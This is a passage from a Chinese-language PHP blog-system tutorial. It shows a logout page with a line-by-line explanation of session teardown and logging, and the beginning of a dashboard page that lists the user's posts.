class="line">        .logout-container &#123;</span><br><span class="line">            background: white;</span><br><span class="line">            padding: <span class="number">2</span>rem;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line">            text-align: center;</span><br><span class="line">            max-width: <span class="number">500</span>px;</span><br><span class="line">            margin: <span class="number">2</span>rem auto;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .success-icon &#123;</span><br><span class="line">            font-size: <span class="number">4</span>rem;</span><br><span class="line">            color: <span class="comment">#27ae60;</span></span><br><span class="line">            margin-bottom: <span class="number">1</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .auto-redirect &#123;</span><br><span class="line">            margin-top: <span class="number">1.5</span>rem;</span><br><span class="line">            color: <span class="comment">#7f8c8d;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .countdown &#123;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            color: <span class="comment">#e74c3c;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .btn-group &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            gap: <span class="number">1</span>rem;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            margin-top: <span class="number">1.5</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot;&gt;注册&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">logout</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">success</span>-<span class="title">icon</span>&quot;&gt;✓&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;退出成功&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span>&gt;您已成功退出登录，感谢您使用我们的博客系统&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">btn</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;重新登录&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot; <span class="title">style</span>=&quot;<span class="title">background</span>: #95<span class="title">a5a6</span>;&quot;&gt;返回首页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">auto</span>-<span class="title">redirect</span>&quot;&gt;页面将在 &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">countdown</span>&quot; <span class="title">id</span>=&quot;<span class="title">countdown</span>&quot;&gt;5&lt;/<span class="title">span</span>&gt; 秒后自动跳转到登录页面&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&amp;<span class="title">copy</span>; &lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">date</span>(&#x27;<span class="title">Y</span>&#x27;); ?&gt; 我的博客. 保留所有权利.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        // 自动跳转功能</span></span><br><span class="line"><span class="class">        <span class="title">let</span> <span class="title">countdown</span> = 5;</span></span><br><span class="line"><span class="class">        <span class="title">const</span> <span class="title">countdownElement</span> = <span class="title">document</span>.<span class="title">getElementById</span>(&#x27;<span class="title">countdown</span>&#x27;);</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        <span class="title">const</span> <span class="title">timer</span> = <span class="title">setInterval</span>(<span class="title">function</span>() </span>&#123;</span><br><span class="line">            countdown--;</span><br><span class="line">            countdownElement.textContent = countdown;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (countdown &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">clearInterval</span>(timer);</span><br><span class="line">                window.location.href = <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>现在详细解释一下每行代码。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li>条件判断，检查会话中是否存在<code>&#39;username&#39;</code>变量，<code>isset()</code>函数检查变量是否已设置且不为null。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$logout_time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$log_message</span> = <span class="string">&quot;用户 <span class="subst">&#123;$username&#125;</span> 于 <span class="subst">&#123;$logout_time&#125;</span> 注销\n&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li><code>$username = $_SESSION[&#39;username&#39;]</code>：从会话中获取用户名并赋值给局部变量。</li><li><code>$logout_time = date(&#39;Y-m-d H:i:s&#39;)</code>：获取当前格式化的日期时间字符串。<ul><li><code>date(&#39;Y-m-d H:i:s&#39;)</code>：生成”年-月-日 时:分:秒”格式的时间戳。</li></ul></li><li><code>$log_message = &quot;用户 &#123;$username&#125; 于 &#123;$logout_time&#125; 注销\n&quot;</code>：构造日志消息字符串。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;logs&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;logs&#x27;</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用于创造日志目录。</li><li><code>if (!is_dir(&#39;logs&#39;))</code>：检查’logs’目录是否存在。</li><li><code>mkdir(&#39;logs&#39;, 0755, true)</code>：创建目录的函数调用。<ul><li>参数一：<code>&#39;logs&#39;</code>：要创建的目录名。</li><li>参数二：<code>0755</code>：目录权限设置（所有者可读写执行，组和其他用户可读执行）。</li><li>参数三：<code>true</code>：允许创建多级目录（递归创建）。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;logs/logout.log&#x27;</span>, <span class="variable">$log_message</span>, FILE_APPEND | LOCK_EX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>写入到日志文件。</li><li><code>FILE_APPEND</code>：常量，表示追加模式（不在文件开头写入）。</li><li><code>LOCK_EX</code>：常量，表示独占锁，防止并发写入冲突。</li><li><code>|</code>：位或运算符，组合多个选项。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure><ul><li>清空会话变量，将会话全局变量重新赋值为空数组，会清空所有会话数据，但是会话ID仍然存在。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.use_cookies&quot;</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>ini_get(&quot;session.use_cookies&quot;)</code>：获取PHP配置中是否使用Cookie来管理会话。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$params</span> = <span class="title function_ invoke__">session_get_cookie_params</span>();</span><br></pre></td></tr></table></figure><ul><li><code>session_get_cookie_params()</code>：返回当前会话Cookie的详细参数数组。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">42000</span>,</span><br><span class="line">        <span class="variable">$params</span>[<span class="string">&quot;path&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;domain&quot;</span>],</span><br><span class="line">        <span class="variable">$params</span>[<span class="string">&quot;secure&quot;</span>], <span class="variable">$params</span>[<span class="string">&quot;httponly&quot;</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><ul><li>设置过期Cookie<ul><li><code>setcookie()</code>：设置Cookie的函数。</li><li><code>session_name()</code>：获取当前会话的名称（通常是”PHPSESSID”）。</li><li><code>&#39;&#39;</code>：空值，清除Cookie内容。</li><li><code>time() - 42000</code>：将过期时间设为过去（当前时间减42000秒），使浏览器立即删除Cookie。</li><li>后续参数使用原Cookie的相同设置，确保正确删除。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br></pre></td></tr></table></figure><ul><li>彻底销毁会话，删除服务器上的会话数据文件。</li></ul><h3 id="3-dashboard文件夹"><a href="#3-dashboard文件夹" class="headerlink" title="3. dashboard文件夹"></a>3. dashboard文件夹</h3><ul><li>此目录下包含博客系统控制台下的功能，包括文章的删除、编辑、新建和控制台首页</li></ul><h4 id="3-1-index-php（文章首页）"><a href="#3-1-index-php（文章首页）" class="headerlink" title="3.1 index.php（文章首页）"></a>3.1 <code>index.php</code>（文章首页）</h4><ul><li>控制台首页页面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ../login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户文章</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM posts </span></span><br><span class="line"><span class="string">    WHERE author_id = ? </span></span><br><span class="line"><span class="string">    ORDER BY created_at DESC</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br><span class="line"><span class="variable">$posts</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;控制台 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .dashboard &#123;</span><br><span class="line">            display: grid;</span><br><span class="line">            grid-template-columns: <span class="number">250</span>px <span class="number">1</span>fr;</span><br><span class="line">            gap: <span class="number">2</span>rem;</span><br><span class="line">            min-height: <span class="number">80</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .sidebar &#123;</span><br><span class="line">            background: <span class="comment">#2c3e50;</span></span><br><span class="line">            color: white;</span><br><span class="line">            padding: <span class="number">1.5</span>rem;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .sidebar ul &#123;</span><br><span class="line">            <span class="keyword">list</span>-style: none;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .sidebar li &#123;</span><br><span class="line">            margin: <span class="number">1</span>rem <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .sidebar a &#123;</span><br><span class="line">            color: white;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            display: block;</span><br><span class="line">            padding: <span class="number">0.5</span>rem;</span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">            transition: background <span class="number">0.3</span>s;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .sidebar a:hover, .sidebar a.active &#123;</span><br><span class="line">            background: <span class="comment">#34495e;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .main-content &#123;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .posts-table &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            border-collapse: collapse;</span><br><span class="line">            background: white;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .posts-table th, .posts-table td &#123;</span><br><span class="line">            padding: <span class="number">1</span>rem;</span><br><span class="line">            text-align: left;</span><br><span class="line">            border-bottom: <span class="number">1</span>px solid <span class="comment">#eee;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .posts-table th &#123;</span><br><span class="line">            background: <span class="comment">#f8f9fa;</span></span><br><span class="line">            font-weight: <span class="number">600</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .btn &#123;</span><br><span class="line">            padding: <span class="number">0.5</span>rem <span class="number">1</span>rem;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            font-size: <span class="number">0.9</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .btn-primary &#123;</span><br><span class="line">            background: <span class="comment">#3498db;</span></span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .btn-danger &#123;</span><br><span class="line">            background: <span class="comment">#e74c3c;</span></span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .btn-edit &#123;</span><br><span class="line">            background: <span class="comment">#f39c12;</span></span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .post-actions &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            gap: <span class="number">0.5</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;../<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;控制台&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">dashboard</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">aside</span> <span class="title">class</span>=&quot;<span class="title">sidebar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;文章管理&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">new</span>-<span class="title">post</span>.<span class="title">php</span>&quot;&gt;写文章&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;评论管理&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;个人资料&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">aside</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">main</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">display</span>: <span class="title">flex</span>; <span class="title">justify</span>-<span class="title">content</span>: <span class="title">space</span>-<span class="title">between</span>; <span class="title">align</span>-<span class="title">items</span>: <span class="title">center</span>; <span class="title">margin</span>-<span class="title">bottom</span>: 1.5<span class="title">rem</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h2</span>&gt;我的文章&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">new</span>-<span class="title">post</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;写新文章&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">count</span>($<span class="title">posts</span>) &gt; 0): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">posts</span>-<span class="title">table</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">th</span>&gt;标题&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">th</span>&gt;状态&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">th</span>&gt;发布时间&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">th</span>&gt;操作&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">foreach</span>($<span class="title">posts</span> <span class="title">as</span> $<span class="title">post</span>): ?&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;../<span class="title">post</span>.<span class="title">php</span>?<span class="title">id</span>=&lt;?= $<span class="title">post</span>[&#x27;<span class="title">id</span>&#x27;] ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">title</span>&#x27;]) ?&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">span</span> <span 